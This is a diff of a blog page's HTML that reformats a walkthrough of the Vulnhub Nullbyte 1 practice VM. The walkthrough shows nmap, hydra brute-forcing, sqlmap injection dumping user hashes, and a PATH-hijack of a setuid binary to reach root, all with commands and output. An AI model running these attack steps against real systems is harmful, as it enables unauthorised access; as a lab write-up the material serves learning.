@@ -9,7 +9,7 @@
         <meta name="author" content="Sven Steinbauer">
 
 
-        <title>"Nullbyte 1 solution"</title>
+        <title>Nullbyte 1 solution</title>
 
         <!-- Bootstrap Core CSS -->
         <link href="/theme/css/bootstrap.min.css" rel="stylesheet">
@@ -39,12 +39,6 @@
 
         <meta name="author" content="Sven Steinbauer">
 
-        <meta name="tags" content="[walkthrough">
-        <meta name="tags" content="nullbyte">
-        <meta name="tags" content="vulnhub">
-        <meta name="tags" content="security">
-        <meta name="tags" content="solution">
-        <meta name="tags" content="NB0x01]">
 
 	                <meta property="og:locale" content="">
 		<meta property="og:site_name" content="Unlogic">
@@ -52,7 +46,7 @@
 	<meta property="og:type" content="article">
             <meta property="article:author" content="Sven Steinbauer" >
 	<meta property="og:url" content="/2015/08/25/nullbyte-1-solution/">
-	<meta property="og:title" content=""Nullbyte 1 solution"">
+	<meta property="og:title" content="Nullbyte 1 solution">
 	<meta property="article:published_time" content="2015-08-25 00:00:00+01:00">
             <meta property="og:description" content="I've been AFK for a while because of various reasons, but now I'm back and have managed to scrape a little time together to get on with ...">
 
@@ -94,7 +88,7 @@
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
-                        <h1>"Nullbyte 1 solution"</h1>
+                        <h1>Nullbyte 1 solution</h1>
                         <span class="meta">Posted by
                                 <a href="/author/sven-steinbauer.html">Sven Steinbauer</a>
                              on Tue 25 August 2015
@@ -114,37 +108,38 @@
     <!-- Post Content -->
     <article>
         <p>I've been AFK for a while because of various reasons, but now I'm back and have
-managed to scrape a little time together to get on with some of <a href="https://vulnhub.com">Vulnhub's</a>
-new VMs. </p>
-<p>So let's start with <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte 1</a></p>
-<h1>Stage 1</h1>
+managed to scrape a little time together to get on with some of <a class="reference external" href="https://vulnhub.com">Vulnhub's</a>
+new VMs.</p>
+<p>So let's start with <a class="reference external" href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte 1</a></p>
+<div class="section" id="stage-1">
+<h2>Stage 1</h2>
 <p>I ran the usual service discovery and found:</p>
-<p>{% highlight bash %}
-root@kali:~# nmap -sV 192.168.56.101</p>
-<p _="%" endhighlight="endhighlight">Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-08-25 11:29 BST
-Nmap scan report for 192.168.56.101
-Host is up (0.00057s latency).
-Not shown: 997 closed ports
+<div class="highlight"><pre><span></span>root@kali:~# nmap -sV 192.168.56.101
+
+Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-08-25 11:29 BST
+Nmap scan report <span class="k">for</span> 192.168.56.101
+Host is up <span class="o">(</span>0.00057s latency<span class="o">)</span>.
+Not shown: <span class="m">997</span> closed ports
 PORT    STATE SERVICE VERSION
-80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
-111/tcp open  rpcbind 2-4 (RPC #100000)
-777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+80/tcp  open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+111/tcp open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+777/tcp open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</pre></div>
 <p>HTTP server on 80 and ssh on 777. I'm going to take the straightforward one, and head
 to the HTTP server first.</p>
 <p>Upon opening the page I only get an image and some text</p>
-<p>{% img http://i.imgur.com/SlVGKol.png %}</p>
+<img alt="" src="&quot;http://i.imgur.com/SlVGKol.png&quot;" />
 <p>I ran <code>dirbuster</code> on the root and got a couple of hits: <code>uploads</code> and <code>phpmyadmin</code>. The first had disabled directory listing
 and the second was a no go, but at least told me there was a SQL server available somewhere.</p>
 <p>The source of the page doesn't reveal anything else either, so that last place we might be able to find something
 is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image
 either. Well, let me take a look at the EXIF data then.</p>
-<p _="%" endhighlight="endhighlight">{% highlight bash %}
-root@kali:~/Downloads# exiftool main.gif 
+<div class="highlight"><pre><span></span>root@kali:~/Downloads# exiftool main.gif
 ExifTool Version Number         : 9.74
 File Name                       : main.gif
 Directory                       : .
-File Size                       : 16 kB
+File Size                       : <span class="m">16</span> kB
 File Modification Date/Time     : 2015:08:25 10:27:37+01:00
 File Access Date/Time           : 2015:08:25 10:28:35+01:00
 File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
@@ -158,95 +153,107 @@ Has Color Map                   : No
 Color Resolution Depth          : 8
 Bits Per Pixel                  : 1
 Background Color                : 0
-Comment                         : P-): kzMb5nVYJw
-Image Size                      : 235x302</p>
+Comment                         : P-<span class="o">)</span>: kzMb5nVYJw
+Image Size                      : 235x302
+</pre></div>
 <p>Hrmm, that comment looks unusual. Let's try that in the URL. Initially I got a 404
-but that's because I didn't remove the <code>P-):</code>. Hitting <code>http://192.168.56.101/kzMb5nVYJw</code>
+but that's because I didn't remove the <code>P-): `. Hitting :code:`http://192.168.56.101/kzMb5nVYJw</code>
 takes me to a form asking for a key.</p>
-<h1>Stage 2</h1>
+</div>
+<div class="section" id="stage-2">
+<h2>Stage 2</h2>
 <p>Typing in something random just shows <code>invalid key</code>. Ok, let me take a look at the source,
 see where this thing goes.</p>
-<p>{% highlight html %}</p>
-<p _="%" endhighlight="endhighlight"><center>
-<form method="post" action="index.php">
-Key:<br>
-<input type="password" name="key">
-</form> 
-</center>
-&lt;!-- this form isn't connected to mysql, password ain't that complex --!&gt;</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span><span class="p">&gt;</span>
+Key:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;key&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&gt;</span>
+</pre></div>
 <p>Ok, so no SQLi here then, and the password isn't complex either. I'm guessing
 a simple wordlist might solve this for me. Time to break out <code>hydra</code> for this:</p>
-<p>{% highlight bash %}
-root@kali:~# hydra 192.168.56.101 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P /usr/share/dict/words -t 10 -w 30
-Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</p>
-<p _="%" endhighlight="endhighlight">Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-25 11:41:58
-[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
-[DATA] attacking service http-post-form on port 80
-[STATUS] 18687.00 tries/min, 18687 tries in 00:01h, 80484 todo in 00:05h, 10 active
-[80][http-post-form] host: 192.168.56.101   login: x   password: elite
-1 of 1 target successfully completed, 1 valid password found</p>
+<div class="highlight"><pre><span></span>root@kali:~# hydra 192.168.56.101 http-form-post <span class="s2">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l x -P /usr/share/dict/words -t <span class="m">10</span> -w 30
+Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
+
+Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2015-08-25 11:41:58
+<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">10</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">99171</span> login tries <span class="o">(</span>l:1/p:99171<span class="o">)</span>, ~154 tries per task
+<span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
+<span class="o">[</span>STATUS<span class="o">]</span> 18687.00 tries/min, <span class="m">18687</span> tries in 00:01h, <span class="m">80484</span> todo in 00:05h, <span class="m">10</span> active
+<span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 192.168.56.101   login: x   password: elite
+<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</pre></div>
 <p>Bingo. Once I enter that into the field I am able to search for usernames.</p>
-<h1>Stage 3</h1>
+</div>
+<div class="section" id="stage-3">
+<h2>Stage 3</h2>
 <p>Entering all sorts of names reveals nothing. At this point I am guessing this
 is the part that is backed by a SQL database. Although usernames and the usual
 SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will
 try to <code>sqlmap</code> the URL to see if there's any vulnerabilities there</p>
-<p>{% highlight bash %}
-root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=</p>
-<p><snip></p>
-<p _="%" endhighlight="endhighlight">[11:13:26] [INFO] GET parameter 'usrtosearch' seems to be 'MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)' injectable 
-[11:13:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[11:13:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
-[11:13:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[11:13:26] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[11:13:26] [INFO] target URL appears to have 3 columns in query
-[11:13:26] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable</p>
+<div class="highlight"><pre><span></span>root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>
+
+&lt;snip&gt;
+
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> seems to be <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span> injectable
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for</span> UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> ORDER BY technique seems to be usable. This should reduce the <span class="nb">time</span> needed to find the right number of query columns. Automatically extending the range <span class="k">for</span> current UNION query injection technique <span class="nb">test</span>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL appears to have <span class="m">3</span> columns in query
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> is <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
+</pre></div>
 <p>Result! Using this we can now dump the databasenames, tables, and data in the DB</p>
 <p>(output shortened for clarity)
-{% highlight bash %}
-root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --current-db
+.. code-block:: bash</p>
+<blockquote>
+<p><a class="reference external" href="mailto:root&#64;kali">root&#64;kali</a>:~# sqlmap -u <a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses">http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses</a> --current-db
 back-end DBMS: MySQL 5.0.12
 [11:13:44] [INFO] fetching current database
 current database:    'seth'</p>
-<p>root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --tables -D seth
+<p><a class="reference external" href="mailto:root&#64;kali">root&#64;kali</a>:~# sqlmap -u <a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses">http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses</a> --tables -D seth
 [11:13:55] [INFO] fetching tables for database: 'seth'
 Database: seth
 [1 table]
 +-------+
 | users |
 +-------+</p>
-<p _="%" endhighlight="endhighlight">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --dump -D seth -T users
+<p><a class="reference external" href="mailto:root&#64;kali">root&#64;kali</a>:~# sqlmap -u <a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses">http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses</a> --dump -D seth -T users
 Database: seth
 Table: users
 [2 entries]
 +----+---------------------------------------------+--------+------------+
 | id | pass                                        | user   | position   |
 +----+---------------------------------------------+--------+------------+
-| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |
 | 2  | --not allowed--                             | isis   | employee   |
 +----+---------------------------------------------+--------+------------+</p>
-<p>An MD5 hashed password? I best put that through <a href="http://md5decoder.org/">md5decoder</a> to
+</blockquote>
+<p>An MD5 hashed password? I best put that through <a class="reference external" href="http://md5decoder.org/">md5decoder</a> to
 be rewarded with the password <code>omega</code></p>
-<h1>stage 4</h1>
-<p>Turns out that this is ramses's password on the ssh service that's running on 
+</div>
+<div class="section" id="stage-4">
+<h2>stage 4</h2>
+<p>Turns out that this is ramses's password on the ssh service that's running on
 port 777 on the VM. So I'll connect to that and have a look at what's going on there.</p>
 <p>Not much in his home directory, so I'll checkout what he's been up to</p>
-<p _="%" endhighlight="endhighlight">{% highlight bash %}
-ramses@NullByte:~$ cat .bash_history 
+<div class="highlight"><pre><span></span>ramses@NullByte:~$ cat .bash_history
 sudo -s
 su eric
-exit
+<span class="nb">exit</span>
 ls
 clear
-cd /var/www
-cd backup/
+<span class="nb">cd</span> /var/www
+<span class="nb">cd</span> backup/
 ls
-./procwatch 
+./procwatch
 clear
 sudo -s
-cd /
+<span class="nb">cd</span> /
 ls
-exit</p>
+<span class="nb">exit</span>
+</pre></div>
 <p>Interesting, ramses has something in <code>/var/www</code>. Seems like a setuid root
 binary called <code>procwatch</code>. After running it I would assume that it's just running <code>ps</code>
 to return a list of processes. If I run <code>ps</code> on its own, I get the same output (minus
@@ -254,28 +261,27 @@ procwatch of course)</p>
 <p>So let's see if it calls <code>ps</code> with an absolute path, or not. As a quick test I'll create
 a symlink to <code>ls</code> in the current directory and name it <code>ps</code>. Then I set the <code>PATH</code> environment variable
 with the current dir at the front.</p>
-<p _="%" endhighlight="endhighlight">{% highlight bash %}
-ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
-ramses@NullByte:/var/www/backup$ export PATH=<code>pwd</code>:${PATH}
-ramses@NullByte:/var/www/backup$ ./procwatch 
-ls  procwatch  ps  readme.txt</p>
+<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
+ramses@NullByte:/var/www/backup$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:<span class="si">${</span><span class="nv">PATH</span><span class="si">}</span>
+ramses@NullByte:/var/www/backup$ ./procwatch
+ls  procwatch  ps  readme.txt
+</pre></div>
 <p>Excellent, it just calls <code>ps</code> without a path. A classic issue you can often
 find in programs that call other programs.</p>
 <p>So let me leverage this to get myself a root shell and ultimately the flag</p>
-<p>{% highlight bash %}
-ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
-ramses@NullByte:/var/www/backup$ ./procwatch </p>
-<h1>whoami</h1>
-<p>root</p>
-<h1>cat /root/proof.txt</h1>
-<p _="%" endhighlight="endhighlight">[OUTPUT CUT]</p>
+<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
+ramses@NullByte:/var/www/backup$ ./procwatch
+<span class="c1"># whoami</span>
+root
+<span class="c1"># cat /root/proof.txt</span>
+<span class="o">[</span>OUTPUT CUT<span class="o">]</span>
+</pre></div>
 <p>And that concludes the NullByte VM walkthrough. A nice little machine with some fun
 challenges. Thanks to ly0n for creating it.</p>
+</div>
+
     </article>
 
-        <div class="tags">
-            <p>tags: <a href="/tag/walkthrough.html">[walkthrough</a>, <a href="/tag/nullbyte.html">nullbyte</a>, <a href="/tag/vulnhub.html">vulnhub</a>, <a href="/tag/security.html">security</a>, <a href="/tag/solution.html">solution</a>, <a href="/tag/nb0x01.html">NB0x01]</a>, </p>
-        </div>
 
 <hr>
 <div class="sharing">
